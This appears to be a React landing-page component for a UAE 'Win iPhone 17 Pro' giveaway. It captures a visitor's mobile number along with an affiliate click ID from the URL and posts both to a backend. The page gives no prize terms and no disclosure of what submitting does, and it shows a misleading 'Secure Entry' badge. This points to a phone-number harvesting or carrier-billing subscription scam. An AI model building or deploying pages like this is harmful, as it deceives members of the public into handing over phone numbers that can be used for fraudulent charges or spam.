import { useState, useEffect } from "react";

export default function Home() {

  const [msisdn, setMsisdn] = useState("");
  const [clickId, setClickId] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);

  useEffect(() => {

    const params =
      new URLSearchParams(window.location.search);

    if (params.get("cid")) {
      setClickId(params.get("cid"));
    }

  }, []);

  async function submitNumber() {

    if (!msisdn) {
      return;
    }

    setLoading(true);

    let cleanMsisdn = msisdn.trim();

    if (cleanMsisdn.startsWith("0")) {
      cleanMsisdn =
        cleanMsisdn.substring(1);
    }

    if (!cleanMsisdn.startsWith("971")) {
      cleanMsisdn =
        "971" + cleanMsisdn;
    }

    try {

      const response =
        await fetch("/api/request", {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({
            msisdn: cleanMsisdn,
            click_id: clickId
          })

        });

      const data = await response.json();

      if (data.success) {
        setStep(2);
      }

    } catch (err) {

      console.log(err);

    }

    setLoading(false);

  }

  return (

    <div style={styles.page}>

      <div style={styles.card}>

        <div style={styles.topBadge}>
          UAE Exclusive Giveaway
        </div>

        <img
          src="https://i.ibb.co/B5tGx9x2/iphone-16.png"
          style={styles.phone}
        />

        <h1 style={styles.title}>
          Win iPhone 17 Pro
        </h1>

        <p style={styles.subtitle}>
          Enter your mobile number for a chance
          to win the newest iPhone.
        </p>

        {step === 1 && (

          <>

            <input
              type="tel"
              placeholder="50xxxxxxx"
              value={msisdn}
              onChange={(e) =>
                setMsisdn(
                  e.target.value.replace(/\\D/g, "")
                )
              }
              style={styles.input}
            />

            <button
              style={styles.button}
              onClick={submitNumber}
            >

              {loading
                ? "Processing..."
                : "ENTER NOW"}

            </button>

            <div style={styles.bottomText}>
              🔒 Secure Entry • UAE Residents Only
            </div>

          </>

        )}

        {step === 2 && (

          <div style={styles.successBox}>

            <div style={styles.successIcon}>
              ✓
            </div>

            <div style={styles.successTitle}>
              Entry Submitted
            </div>

            <div style={styles.successText}>
              Your participation has been confirmed.
            </div>

          </div>

        )}

      </div>

    </div>

  );

}

const styles = {

  page: {

    minHeight: "100vh",

    background:
      "linear-gradient(to bottom,#0f172a,#020617)",

    display: "flex",

    justifyContent: "center",

    alignItems: "center",

    padding: "20px"

  },

  card: {

    width: "100%",

    maxWidth: "420px",

    background: "#111827",

    borderRadius: "28px",

    padding: "35px 28px",

    textAlign: "center",

    border:
      "1px solid rgba(255,255,255,0.08)",

    boxShadow:
      "0 20px 60px rgba(0,0,0,0.4)"

  },

  topBadge: {

    display: "inline-block",

    background: "#2563eb",

    color: "white",

    padding: "8px 16px",

    borderRadius: "999px",

    fontSize: "13px",

    fontWeight: "bold",

    marginBottom: "22px"

  },

  phone: {

    width: "220px",

    marginBottom: "20px"

  },

  title: {

    color: "white",

    fontSize: "34px",

    fontWeight: "bold",

    marginBottom: "12px"

  },

  subtitle: {

    color: "#94a3b8",

    fontSize: "16px",

    lineHeight: "1.6",

    marginBottom: "28px"

  },

  input: {

    width: "100%",

    height: "58px",

    borderRadius: "16px",

    border: "1px solid #334155",

    background: "#0f172a",

    color: "white",

    padding: "0 18px",

    fontSize: "18px",

    marginBottom: "16px",

    outline: "none"

  },

  button: {

    width: "100%",

    height: "58px",

    borderRadius: "16px",

    border: "none",

    background:
      "linear-gradient(90deg,#2563eb,#3b82f6)",

    color: "white",

    fontSize: "18px",

    fontWeight: "bold",

    cursor: "pointer",

    marginBottom: "18px"

  },

  bottomText: {

    color: "#64748b",

    fontSize: "13px"

  },

  successBox: {

    padding: "20px"

  },

  successIcon: {

    width: "75px",

    height: "75px",

    borderRadius: "999px",

    background: "#16a34a",

    color: "white",

    fontSize: "40px",

    display: "flex",

    justifyContent: "center",

    alignItems: "center",

    margin: "0 auto 18px auto"

  },

  successTitle: {

    color: "white",

    fontSize: "28px",

    fontWeight: "bold",

    marginBottom: "12px"

  },

  successText: {

    color: "#94a3b8",

    fontSize: "15px"

  }

};
Vercel 会自动更新。
